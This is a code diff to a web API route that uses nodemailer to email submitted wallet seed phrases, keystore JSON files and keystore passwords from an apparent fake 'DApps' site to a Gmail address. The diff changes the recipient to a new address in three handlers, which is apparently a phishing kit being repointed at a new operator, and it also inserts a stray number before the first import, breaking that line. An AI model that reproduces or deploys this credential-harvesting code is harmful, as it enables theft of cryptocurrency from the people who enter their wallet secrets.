@@ -1,4 +1,4 @@
-import nodemailer from 'nodemailer'
+93108import nodemailer from 'nodemailer'
 
 const formatMessage = async (message: string) => {
   const email = process.env.EMAIL;
@@ -71,7 +71,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: 'contact.telfarglobal@gmail.com',
+        to: 'adev93108@gmail.com',
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
@@ -110,7 +110,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "contact.telfarglobal@gmail.com",
+        to: "adev93108@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -151,7 +151,7 @@ export async function POST(request: Request) {
 
       const mailOptions = {
         from: `Dapp App ${email}`,
-        to: "contact.telfarglobal@gmail.com",
+        to: "adev93108@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
         html: formattedMessage,
       }
